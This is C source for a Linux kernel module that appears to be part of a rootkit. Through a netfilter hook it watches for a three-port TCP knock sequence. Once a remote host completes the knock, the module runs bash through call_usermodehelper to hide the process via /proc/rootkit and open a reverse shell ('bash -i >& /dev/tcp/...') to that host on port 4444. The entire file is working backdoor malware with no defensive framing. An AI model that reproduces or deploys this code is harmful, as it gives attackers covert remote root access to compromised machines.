#include "port_knocking.h"

#define KNOCK_LENGTH 3
#define LPORT 4444

static int knocking_ports[KNOCK_LENGTH] = {5295, 9257, 7369};

struct knocker
{
	int knocking_counter;
    u32 ipv_addr;
};

struct nf_hook_ops netf_port_knock;
struct knocker current_knocker;
struct semaphore knocker_sem;

static char bash_command[80];

static void exec_command(struct work_struct *w);

DECLARE_WORK(exec_work, exec_command);

static void exec_command(struct work_struct *w)
{
	char *argv[] = { "/bin/bash", "-c", bash_command, NULL};

	char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

	call_usermodehelper(argv[0], argv, env, UMH_WAIT_EXEC);
}

void exec_reverse_shell(u32 ip_addr)
{    
    sprintf(bash_command, "echo hide$$ > /proc/rootkit && bash -i >& /dev/tcp/%d.%d.%d.%d/%d 0>&1", 
            (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24), LPORT);

    schedule_work(&exec_work);
}

int knockable_port_index(int port)
{
    int i;
	for (i = 0; i < KNOCK_LENGTH; i ++)
        if (port == knocking_ports[i])
            return i;
            
    return -1;
}

void set_current(u32 ip_addr, int port_index)
{
    down(&knocker_sem);

    current_knocker.ipv_addr = ip_addr;
    current_knocker.knocking_counter = port_index;

    up(&knocker_sem);
}

void check_knock(int port_index, u32 ip_addr)
{
    if (current_knocker.ipv_addr == ip_addr)
    {
        if (port_index == current_knocker.knocking_counter + 1)
        {
            down(&knocker_sem);
            current_knocker.knocking_counter ++;
            up(&knocker_sem);

            if (current_knocker.knocking_counter == KNOCK_LENGTH - 1)
            {
                FM_INFO("Port knock successful from %d.%d.%d.%d\n", (u8)ip_addr >> 0, (u8)(ip_addr >> 8), (u8)(ip_addr >> 16), (u8)(ip_addr >> 24));
                exec_reverse_shell(ip_addr);
                set_current(0, 0);
            }
        }
        else
            set_current(ip_addr, -1);
        
    }
    else if (port_index == 0)
        set_current(ip_addr, port_index);
}

unsigned int netf_hook_fn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int port_index;

    ip_header = ip_hdr(skb);
    if (!ip_header || ip_header->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcp_header = tcp_hdr(skb);

    port_index = knockable_port_index(ntohs(tcp_header->dest));
    if (port_index == -1)
        return NF_ACCEPT;

    check_knock(port_index, ip_header->saddr);

    return NF_ACCEPT;
}

int port_knocking_init(void)
{
    sema_init(&knocker_sem, 1);

    netf_port_knock.hook = netf_hook_fn;
    netf_port_knock.hooknum = NF_INET_LOCAL_IN;
    netf_port_knock.pf = PF_INET;
    netf_port_knock.priority = NF_IP_PRI_FIRST;

    if (nf_register_net_hook(&init_net, &netf_port_knock) < 0)
        return 1;

    return 0;
}

int port_knocking_clean(void)
{
    nf_unregister_net_hook(&init_net, &netf_port_knock);

    return 0;
}